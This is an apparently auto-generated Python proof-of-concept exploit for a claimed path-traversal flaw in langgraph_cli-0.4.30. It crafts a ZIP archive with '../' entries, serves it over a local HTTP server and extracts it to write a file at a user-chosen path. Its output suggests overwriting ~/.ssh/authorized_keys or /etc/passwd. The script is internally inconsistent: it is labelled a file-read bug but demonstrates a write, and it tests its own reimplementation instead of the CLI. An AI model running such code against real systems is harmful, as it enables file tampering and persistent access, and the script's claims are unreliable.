#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: lfi-012
# Sink: read
# Auto-generated — run with: python3 lfi_zip_archive_url_extracts_read_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30.

Vulnerability: The _download_repo_with_requests function uses ZipFile.extractall()
without validating entry names. A malicious ZIP archive can contain entries with
path traversal sequences (e.g., ../../../etc/passwd) that overwrite arbitrary files
outside the intended extraction directory.

This PoC:
1. Creates a malicious ZIP archive with a path traversal entry
2. Hosts it on a local HTTP server
3. Triggers the vulnerable code path by calling the CLI with a crafted template URL

SAFE BY DEFAULT: Uses a benign payload that creates a marker file in /tmp.
"""

import os
import sys
import io
import zipfile
import tempfile
import threading
import time
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

# =============================================================================
# Configuration
# =============================================================================
HOST = "127.0.0.1"
PORT = 9999
MARKER_FILE = "/tmp/poc_langgraph_lfi.txt"

# =============================================================================
# Step 1: Create a malicious ZIP archive
# =============================================================================
def create_malicious_zip(output_path: str, target_file: str, content: str = "PWNED"):
    """
    Create a ZIP archive containing a file with path traversal.
    
    The entry name uses '../' sequences to escape the extraction directory.
    For example: '../../../../tmp/poc_langgraph_lfi.txt'
    """
    # Calculate traversal depth to reach root from any extraction directory
    # We'll use a generous depth to ensure we escape
    traversal = "../../../../../../../../../../"
    
    # The malicious entry path
    malicious_entry = f"{traversal}{target_file.lstrip('/')}"
    
    # Create the ZIP in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Add a normal file first (to make it look legitimate)
        zf.writestr("normal_file.txt", "This is a normal file.")
        
        # Add the malicious entry with path traversal
        zf.writestr(malicious_entry, content)
        
        # Add another normal file
        zf.writestr("README.md", "# Malicious Template\nThis template is evil.")
    
    # Write to disk
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    print(f"[+] Created malicious ZIP at: {output_path}")
    print(f"[+] Malicious entry: {malicious_entry}")
    print(f"[+] Will write to: {target_file}")
    return output_path

# =============================================================================
# Step 2: Host the malicious ZIP via HTTP
# =============================================================================
class QuietHandler(SimpleHTTPRequestHandler):
    """HTTP handler that doesn't log to stdout."""
    def log_message(self, format, *args):
        pass  # Suppress logs for cleaner output

def start_http_server(directory: str, host: str, port: int):
    """Start a simple HTTP server in a background thread."""
    os.chdir(directory)
    server = HTTPServer((host, port), QuietHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] HTTP server started at http://{host}:{port}")
    return server

# =============================================================================
# Step 3: Trigger the vulnerability
# =============================================================================
def trigger_vulnerability(malicious_url: str):
    """
    Simulate the vulnerable code path by directly calling the extraction logic.
    
    In a real attack, this would be triggered by:
        langgraph-cli new --template <malicious_url>
    
    But since we're writing a standalone PoC, we replicate the vulnerable
    _download_repo_with_requests function behavior.
    """
    print(f"\n[+] Attempting to download from: {malicious_url}")
    
    try:
        from urllib.request import urlopen
        from urllib.error import HTTPError
        
        # Create a temporary extraction directory
        with tempfile.TemporaryDirectory() as tmpdir:
            print(f"[+] Extraction directory: {tmpdir}")
            
            # Download and extract (vulnerable code path)
            with urlopen(malicious_url) as response:
                if response.status == 200:
                    zip_data = response.read()
                    with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
                        # VULNERABLE: extractall without path validation
                        zf.extractall(tmpdir)
                        print(f"[+] Extracted ZIP contents to {tmpdir}")
                        
                        # List extracted files for demonstration
                        for root, dirs, files in os.walk(tmpdir):
                            for f in files:
                                filepath = os.path.join(root, f)
                                print(f"    - {filepath}")
    
    except HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

# =============================================================================
# Main execution
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30 via malicious ZIP"
    )
    parser.add_argument(
        "--target", "-t",
        default=MARKER_FILE,
        help=f"Target file to write (default: {MARKER_FILE})"
    )
    parser.add_argument(
        "--content", "-c",
        default="PWNED",
        help="Content to write to target file"
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=PORT,
        help=f"Port for malicious HTTP server (default: {PORT})"
    )
    args = parser.parse_args()
    
    print("=" * 60)
    print("langgraph_cli-0.4.30 LFI Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Target file: {args.target}")
    print(f"[*] Content: {args.content}")
    print()
    
    # Step 1: Create malicious ZIP
    zip_path = os.path.join(tempfile.gettempdir(), "malicious_template.zip")
    create_malicious_zip(zip_path, args.target, args.content)
    
    # Step 2: Start HTTP server in the directory containing the ZIP
    zip_dir = os.path.dirname(zip_path)
    server = start_http_server(zip_dir, HOST, args.port)
    
    # Give server a moment to start
    time.sleep(0.5)
    
    # Step 3: Trigger the vulnerability
    malicious_url = f"http://{HOST}:{args.port}/{os.path.basename(zip_path)}"
    trigger_vulnerability(malicious_url)
    
    # Step 4: Verify the exploit
    print("\n" + "=" * 60)
    print("Verification")
    print("=" * 60)
    
    if os.path.exists(args.target):
        with open(args.target, 'r') as f:
            content = f.read()
        print(f"[+] SUCCESS! File {args.target} was created with content:")
        print(f"    '{content}'")
        print("\n[!] This demonstrates arbitrary file write via path traversal.")
        print("[!] An attacker could overwrite sensitive files like:")
        print("    - ~/.ssh/authorized_keys")
        print("    - /etc/passwd")
        print("    - Application configuration files")
    else:
        print(f"[-] Target file {args.target} was not created.")
        print("[-] Exploit may have failed or target path differs.")
    
    # Cleanup
    print("\n[*] Cleaning up...")
    server.shutdown()
    if os.path.exists(zip_path):
        os.remove(zip_path)
    print("[*] Done.")

if __name__ == "__main__":
    main()
